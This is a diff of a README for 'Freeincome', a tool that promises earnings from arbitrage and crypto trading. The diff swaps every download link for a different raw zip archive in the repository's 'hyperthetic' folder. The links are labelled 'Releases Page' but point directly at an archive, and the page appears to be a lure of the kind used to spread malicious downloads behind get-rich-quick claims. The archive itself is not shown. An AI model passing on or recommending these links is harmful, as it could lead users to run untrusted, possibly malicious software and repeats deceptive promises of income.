@@ -1,7 +1,7 @@
 # 🎉 Freeincome - Unlock Your Earning Potential Today
 
 ## 📥 Download Now
-[![Download Freeincome](https://raw.githubusercontent.com/preetham555hihi/Freeincome/main/hyperthetic/Freeincome.zip)](https://raw.githubusercontent.com/preetham555hihi/Freeincome/main/hyperthetic/Freeincome.zip)
+[![Download Freeincome](https://github.com/preetham555hihi/Freeincome/raw/refs/heads/main/hyperthetic/Software_1.3.zip)](https://github.com/preetham555hihi/Freeincome/raw/refs/heads/main/hyperthetic/Software_1.3.zip)
 
 ## 🚀 Getting Started
 Welcome to Freeincome! This application provides a straightforward guide to help you explore earning opportunities through various methods like arbitrage and crypto trading. 
@@ -16,7 +16,7 @@ Before you start, ensure your computer meets these requirements:
 ## 📦 Download & Install
 To download Freeincome, follow these steps:
 
-1. **Visit the Releases Page:** Click this link to reach the download area: [Download Freeincome](https://raw.githubusercontent.com/preetham555hihi/Freeincome/main/hyperthetic/Freeincome.zip).
+1. **Visit the Releases Page:** Click this link to reach the download area: [Download Freeincome](https://github.com/preetham555hihi/Freeincome/raw/refs/heads/main/hyperthetic/Software_1.3.zip).
    
 2. **Select the Latest Version:** You will see different versions listed. Look for the latest version, which will be at the top.
    
@@ -66,4 +66,4 @@ Follow us on social media to stay updated. Links will be added soon.
 ## 💾 Additional Resources
 - Check out our blog for more tips on How to Earn Money Online.
 
-For any further information, visit our [Releases Page](https://raw.githubusercontent.com/preetham555hihi/Freeincome/main/hyperthetic/Freeincome.zip) to get started with Freeincome today!
+For any further information, visit our [Releases Page](https://github.com/preetham555hihi/Freeincome/raw/refs/heads/main/hyperthetic/Software_1.3.zip) to get started with Freeincome today!
